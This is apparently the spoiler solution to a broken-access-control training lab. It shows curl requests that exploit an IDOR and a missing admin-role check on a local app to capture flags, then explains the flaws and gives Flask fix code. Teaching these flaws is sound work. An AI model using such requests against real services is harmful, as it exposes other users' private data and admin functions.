🌐 **English** · [Русский](./SOLUTION.ru.md) · [Oʻzbekcha](./SOLUTION.uz.md)

# A01 — Solution (spoilers!)

Try the lab yourself first, using the hints from the [README](./README.md).

## Exploitation on vulnerable (port 8001)

```bash
# 1. Log in as alice, the cookie is saved to jar.txt
curl -c jar.txt -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}' http://127.0.0.1:8001/login

# 2. Your own notes: id = 1
curl -b jar.txt http://127.0.0.1:8001/api/notes

# 3. IDOR: substitute someone else's id (the admin's note = 3)
curl -b jar.txt http://127.0.0.1:8001/api/notes/3
# → flag FLAG{a01_idor_admin_note}

# 4. Access an administrator function without the admin role
curl -b jar.txt http://127.0.0.1:8001/admin/users
# → the user list and the flag FLAG{a01_admin_panel_open}
```

## The same in the portal

Sign in as `alice`, change the number in the address of a request (`/#/requests/3`) and open the Administration page directly (`/#/admin`), although the menu item is hidden from you. On fixed (port 8002) both pages show “Access denied”. Hiding a menu item is not access control: the server must refuse.

## What is wrong

1. `GET /api/notes/<id>`: the server only checks that the user is logged in, but does not compare `note["owner"]` with the current user (**IDOR**).
2. `GET /admin/users`: the server does not check the role, any session is enough (**missing function-level access control**).

## The fix

```python
# Resource owner
if note["owner"] != current_user():
    return jsonify(error="forbidden"), 403

# Administrator role
def admin_required(view):
    @wraps(view)
    @login_required
    def wrapper(*args, **kwargs):
        if USERS[current_user()]["role"] != "admin":
            return jsonify(error="forbidden"), 403
        return view(*args, **kwargs)
    return wrapper
```

The same requests against fixed (port 8002) return `403 forbidden`. The admin (`admin` / `Adm1n-lab-pass`) still has access to their own notes and to `/admin/users`.

## What else to remember
- A hidden or "unpredictable" URL is not a substitute for a permission check.
- Random identifiers (UUIDs) make enumeration harder but do not remove the need to check the owner.
- Check permissions for write and delete operations too, not only for reading.
